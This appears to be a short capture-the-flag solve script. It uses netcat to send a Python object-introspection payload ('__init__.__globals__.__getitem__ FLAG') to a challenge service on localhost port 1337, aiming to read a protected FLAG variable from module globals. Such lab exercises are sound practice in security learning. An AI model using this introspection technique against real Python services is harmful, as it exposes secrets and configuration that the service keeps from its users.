#!/bin/bash
cat <(echo "__init__.__globals__.__getitem__ FLAG") - | nc localhost 1337